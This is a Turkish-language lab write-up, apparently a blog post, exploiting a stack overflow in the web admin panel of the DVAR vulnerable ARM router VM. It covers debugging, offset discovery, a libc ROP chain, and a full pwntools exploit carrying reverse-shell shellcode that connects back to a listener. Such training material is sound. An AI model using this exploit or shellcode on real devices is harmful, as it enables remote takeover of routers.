Merhabalar, bu yazımızda [bu] adresten ulaşabileceğiniz DVAR makinesinin çözümünü yapacağız. DVAR, ARM Linux tabanlı router sanal makinesidir. İçerisinde yönetici paneli görevini yapan bir web server çalıştırmaktadır. Bu web server'da bulunan zafiyeti kullanarak router'ı uzaktan kontrol edebilecek exploit kodu hazırlayacağız.
Sanal makineyi çalıştırdığımızda bize bir IP adresi veriyor ve bu adres ile router'a erişebiliyoruz. Alttaki resimde gözüktüğü gibi router üzerinde 3 farklı portta bazı servisler çalışmaktadır. 22 portu ile cihaza ssh bağlantısı yapabilir ve cihazı kontrol edebiliriz. Debugging aşamasında ssh bize yardımcı olacak. 80 ve 8080 portlarında iki farklı web server çalışmaktadır. 80 portunda bir router arayüzü bulunmaktadır. 8080 portunda ise bir trafik lambası  uygulaması bulunmaktır. Bu yazımızıda 80 portundaki servisi inceleyeceğiz. Trafik lambası uygulaması başka bir yazının konusudur.

<img src="{{site.baseurl}}/pictures/dvar_1.png">

<img src="{{site.baseurl}}/pictures/dvar_2.png">

**192.168.227.128:80** adresine host makinemiz üzerinden tarayıcı ile ulaştığımızda bizi router yönetici paneli karşılıyor.  Klasik bir router yönetim panelinde görmeye alışık olduğumuz bazı ayarlamalar mevcut. Alt kısımda bulunan **"HELPFUL HINTS"** butonu ile challenge hakkında bazı ipuçları edinebileceğimiz sayfayı görüntüleyebiliriz.

<img src="{{site.baseurl}}/pictures/dvar_3.png">

Adımlardan anlayacağımız üzere bir HTTP isteği ile stack tabanlı hafıza taşma sağlayacağız ve devamında PC register'ını kontrol ederek programı kendi shellcode'umuza yönlendireceğiz. 
80 portunda hangi process 'in çalıştığını öğrenmek için ssh ile makineye bağlandıktan sonra **"netstat -apeen"** komutunu kullanabiliriz. Resimde görüldüğü gibi **"miniweb"** isimli process bizim ilgilendiğimiz yönetim panelini uygulamasını çalıştırıyor.

<img src="{{site.baseurl}}/pictures/dvar_4.png">

Zafiyetin kaynağını belirleyebilmek için yönetici panelinden  üzerinde oluşan  http requestleri kontrol edelim.

<img src="{{site.baseurl}}/pictures/dvar_5.png">

Host name alanına "TEST" değeri girip **"Save Settings"**  butonuna tıkladığımızda oluşan HTTP request aşağıdaki gibidir.

<img src="{{site.baseurl}}/pictures/dvar_6.png">

İlk etapta  programın davranışını izleyebilmek ve olası crash'leri görebilmek için gdb'yi kullanabiliriz. Bunun için sanal makinede hali hazırda kurulu olan gdbserver'i kullanacağız. **"gdbserver :1234 --attach $(pidof miniweb)"** bu komut ile sanal makinede bulunan miniweb prosses'ini host makinemiz üzerinden debug edebileceğiz. Host makinemiz intel mimarili ve debug edeceğimiz program ARM mimariye sahip olduğu için **gdb-multiarch**'ı kullanabiliriz. gdb-multiarch'ı  parametresiz olarak başlattıktan sonra **"target remote 192.168.227.128:1234"** komutu ile artık sanal makinede çalışmakta olan mini web prosses'ini debug edebiliriz. Gönderdiğimiz her bir request ile birlikte miniweb server'ı yeni bir child prosses oluşturduğu için **"set follow-fork-mode child"** bu komutla ile ilgili child prosses'i yakalayabileceğiz.

<img src="{{site.baseurl}}/pictures/dvar_7.png">

Crash'i belirleyebilecek debuging ortamını hazırladık.

<img src="{{site.baseurl}}/pictures/dvar_8.png">

Continue (c) komutunu çalıştırdıktan sonra program kullanıcıdan gelecek istekleri beklemeye başlıyor. Bu noktada farklı türde istekler göndererek programın  davranışını inceleyebiliriz. Yaptığım denemeler sonucunda request query'e fazla değer girildiğinde çökme olduğunu fark ettim. 

<img src="{{site.baseurl}}/pictures/dvar_9.png">

Zafiyet, miniweb binary'sindeki Log fonksiyonundadır.  Log fonksiyonu, kullanıcının yaptığı request URL'sini ve IP adresini belirli bir log dosyasına yazar. Bu yazma işlemi için standart C kütüphanesindeki **vsprintf()** fonksiyonu kullanılmış. vsprintf() fonksiyonu va_list'te bulunan argümanları formatlanmış şeklide belirlenmiş bir stream'e yazabilmeyi sağlar. Bizim örneğimizde vsprintf() kullanılırken IP ve URL argümanlarının boyutları kontrol edilmediğinden işlendiği için ayrılmış buffer alanı taşıyor ve zafiyet meydana geliyor. Log() fonksiyonundaki güvenlik zafiyetine neden olan kısıma ait assembly komutları alttaki resimde gösterilmiştir.

<img src="{{site.baseurl}}/pictures/dvar_10.png">

{% highlight c %}
vsprintf@plt (
       $r0 = buffer,
       $r1 = Format string → "Connection from %s, request = "GET %s"",
       $r2 = IP,
       $r3 = URL
    )
{% endhighlight %}

Normal şartlarda log dosyasında oluşan çıktılar aşağıdaki gibidir.

<img src="{{site.baseurl}}/pictures/dvar_11.png">

<img src="{{site.baseurl}}/pictures/dvar_12.png">

Resimde görüldüğü üzere PC ve LR register'larının üzerine yazabildik. Bu noktada bir ayrıntıya dikkat etmeliyiz. Sadece 'A' karakteri gördermiş olmamıza rağmen PC register'ındaki son değer 1 olması beklenirken 0 olarak ayarlandı. Bu, ARM mimarili işlemcilerde mode değiştirme sırasında register'larının kullanılmıyla alakalı bir konudur. PC register'ının düşük değerlikli biti (**lsb**) işlemci tarafından otomatik olarak  0'a ayarlandığı için bu davranış ortaya çıkıyor. Exploit kodu hazırlarken bu ayrıntıya dikkat etmemizde fayda var.

<img src="{{site.baseurl}}/pictures/dvar_13.png">

Bir sonraki aşamada offset değerini bulmalıyız. Bu sayede kaç karakterden sonra PC üzerine yapabildiğimizi öğrenebiliriz. Bunun için gef içinde bulunan **pattern create** özelliğini kullanabiliriz.

<img src="{{site.baseurl}}/pictures/dvar_14.png">

<img src="{{site.baseurl}}/pictures/dvar_15.png">

<img src="{{site.baseurl}}/pictures/dvar_16.png">

Son resimden anlaşılacağı üzere offset değerinin 341 olduğunu öğrendik. Bu noktada programın akışını istediğimiz gibi değiştirebiliriz. Alttaki resimden de anlaşılacağı üzere programda herhangi bir güvenlik önlemi bulunmamaktadır. Bu da stack alanına yerleştireceğimiz shellcode'u kolaylıkla çalıştırabileceğimiz anlamına gelir.

<img src="{{site.baseurl}}/pictures/dvar_17.png">

Aşağıdaki resimde görüleceği üzere 0x0001353c adresindeki **"pop {r11,lr}"** ve devamındaki **"bx lr"** instruction'ı ile birlikte program return işlemi gerçekleştiriyor. LR register'ının değeri stack'ten alınır ve program o adrese dallanır. Biz hali hazırda LR üzerine yazabildiğimiz için programı istediğimiz yere yönlendirebiliriz. Bu noktada **ROP** tekniğini kullanarak program akışını stack alanına yönlendirerek shellcode'muzu çalıştırmayı deneyeceğiz. 
Programın stack üzerindeki shellcode'u çalıştırabilmesi için **"mov pc，sp"** gibi bir işleve ihtiyacımız olacak. 

<img src="{{site.baseurl}}/pictures/dvar_18.png">

İhtiyaç duyduğumuz instruction'ları program  dahilinde arayabileceğimiz gibi paylaşımlı kütüphanelerde de arayabiliriz. ASLR koruması olmadığı için işimiz daha kolay olacak. Bunun için **ropper** adlı tool'u kullanacağız.  Programın import ettiği kütühaneleri ve path'lerini görebilmek için gef üzerinde **vmmap** komutunu kullanabiliriz

<img src="{{site.baseurl}}/pictures/dvar_19.png">

Ropper tool'u ile libc.so kütüphanesinde ihtiyaç duyduğumuz instruction'ları arayabilmemiz için kütüphane dosyasını host makinemize almamız gerekecek. Bunun için kütüphane dosyasını server root dizinine kopyalayıp **wget** yardımı ile host makinemize alabiliriz. 

**cp /lib/libc.so /www/htdocs/**
**wget http://192.168.227.128/libc.so**

**"ropper --file libc.so --search "mov pc, sp""** komutu ile sp adresini pc register'ına eşitleyecek mov komutunu aradığımızda herhangi bir sonuç alamadık.

<img src="{{site.baseurl}}/pictures/dvar_20.png">

Eğer aradığımız bu instruction mevcut olsaydı tek seferde program akışını stack alanına yönlendirebilecektik.  Şimdi bu işi dolaylı yoldan yapmanın yöntemlerini arayacağız. Bunun için SP adresini spesifik bir register'a atayıp bu register'ı da PC register'ına atayacak instruction'ları arayabiliriz. İlk etapta PC register'ına atama yapan instruction'ları görelim. 

<img src="{{site.baseurl}}/pictures/dvar_21.png">

İlgili işlemi yapan iki farklı instruction bulundu. **"mov pc, r5"** instruction'ı bizim işimizi görebilir. Bir sonraki adımda SP register'ının  r5 register'ına atandığı bir instruction var mı kontrol edelim.

<img src="{{site.baseurl}}/pictures/dvar_22.png">

Maalesef hedeflediğimiz gibi olmadı. Bu noktada anlaşılan o ki kullanacağımız gadget sayısı artacak. SP adresini bir şekilde r5 register'ına atayabiliyor olmalıyız. Bu işlemi yapacak aracı bir register daha kullanabiliriz. r5 register'ina atama yapan diğer register'ları belirleyelim.

<img src="{{site.baseurl}}/pictures/dvar_23.png">

Çıktıdan anlaşılacağı üzere r5 register'ına ataması yapılan r0,r1,r3 register'ları olduğunu görüyoruz.  Bu üç register'dan birisine SP adresinin atanmış olduğunu düşünürsek hedefimize ulaşmış oluruz. 
Hadi r0 register'ı için bu senaryoyu test edelim.

<img src="{{site.baseurl}}/pictures/dvar_24.png">

Evet şanslı günümüzdeyiz, 0x00024100 adresindeki instruction bizim için gayet uygun. 
Nihayet **"mov pc, sp"** işlevini dolaylı olarak yerine getirecek gadget'ları belirledik.

**1 - 0x00024100: mov r0, sp; blx r6;**
**2 - 0x00052454: mov r5, r0; cmp r3, #0; mov r4, r1; beq #0x52478; blx r3;**
**3- 0x0004d8d4: mov pc, r5; mov r7, #1; svc #0; mov lr, pc; bx r5;**

Son aşamada belirlediğimiz gadget'ların sırasıyla çalışabilmeleri için return anında atlama yaptıkları adresleri birbirleriyle ilişkilendirmeliyiz. Hali hazırda 3 tane gadget'ımız bulunmakta ve bunlardan ikisinin return yaptıkları adresler r3 ve r6 register'larında bulunuyor. PC register'ına **0x00024100** adresini, r6 register'ına **0x00052454** adresini ve r3 register'ına da **0x0004d8d4** adresini atamalıyız. Uygun bir pop instruction'ı ile bu atamaları yapabiliriz. 

<img src="{{site.baseurl}}/pictures/dvar_25.png">

Buraya kadar shellcode'muzun çalışmasını sağlayacak ROP adımlarını belirledik. 

**1 - 0x0003c8f0: pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc};**
**2 - 0x00024100: mov r0, sp; blx r6;**
**3 - 0x00052454: mov r5, r0; cmp r3, #0; mov r4, r1; beq #0x52478; blx r3;**
**4 - 0x0004d8d4: mov pc, r5; mov r7, #1; svc #0; mov lr, pc; bx r5;**
**5 - Shellcode**

Hatırlayacağımız üzere stack overflow zafiyeti program içerisindeki **Log()** fonksiyonunda oluşuyordu ve overwrite olmuş LR register'ına dallanmaya çalışıp crash oluyordu. Bu noktada LR register'ına ilk gadget'ın adresini vereceğiz ve program crash olmayıp bizim belirlediğimiz akışta çalışmaya devam edecek. 

Log Fonksiyonu:
{% highlight assembly %} 
.
.
.
pop {r11,lr};
add sp,sp,#16;
bl lr;"
{% endhighlight %}

Sıra geldi exploit kodu hazırlama aşamasına. Dikkat etmemiz gereken bazı ayrıntılar var. Log fonksiyonu çıkışında stack alanı 16 byte küçültüldüğü için payload'ımıza fazladan 16 karakter girmeliyiz. Ayrıca gadget'larımızın  sahip olduğu adresler sıfırıncı adresten referanslandığı için belirlediğimiz o adresler doğru değildir. Gadget'lar libc.so kütüphanesindedir ve bu kütüphane program hafıza alanı içerisinde 0x40000000 adresinden itibaren yerleştirilmiştir. Dolayısıyla gadget adreslerini exploit koda eklerken bu adresten itibaren offset'lemeliyiz. 

Nihai exploit kod aşağıdaki gibidir.

{% highlight python %}
from pwn import *
import struct

buff = "A"*337
r11 = "AAAA"
lr = 0x4003c8f0 #0x40000000 + 0x0003c8f0
stuff = "A"*16
r3 = 0x4004d8d4 #0x40000000 + 0x0004d8d4
r4 = "BBBB"
r5 = "CCCC"
r6 = 0x40052454 #0x40000000 + 0x00052454
r7 = "DDDD"
r8 = "EEEE"
sb = "FFFF"
sl = "GGGG"
fp = "HHHH"
pc = 0x400240fc #0x40000000 + 0x400240fc 
reverse_shell = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x40\x40\x02\x30\x01\x21\x52\x40\x64\x27\xb5\x37\x01\xdf\x06\x1c\x0b\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf\x30\x1c\x49\x40\x3f\x27\x01\xdf\x30\x1c\x01\x31\x01\xdf\x30\x1c\x01\x31\x01\xdf\x06\xa0\x52\x40\x05\xb4\x69\x46\xc2\x71\x0b\x27\x01\xdf\xff\xff\xff\xff\x02\xaa\x11\x5c\xc0\xa8\xe3\x82\x2f\x62\x69\x6e\x2f\x73\x68\x58"

payload = buff
payload += r11
payload += struct.pack("I", lr)
payload += stuff
payload += struct.pack("I", r3)
payload += r4
payload += r5
payload += struct.pack("I", r6)
payload += r7
payload += r8
payload += sb
payload += sl
payload += fp
payload += struct.pack("I", pc)
payload += reverse_shell

conn = remote('192.168.227.128', 80)
conn.send(b'GET /' + payload +"\r\n\r\n")
{% endhighlight %}

<img src="{{site.baseurl}}/pictures/dvar_26.png">

<img src="{{site.baseurl}}/pictures/dvar_27.png">

Exploit kod başarıyla çalıştı ve host makinemizde dinlemeye alıdığımız 4444 port'una  reverse shell bağlantısı gerçekleştirdi. Buraya kadar okuyanlara teşekkür ederim . Gelecek yazılarda görüşmek üzere :)

[bu]: https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html
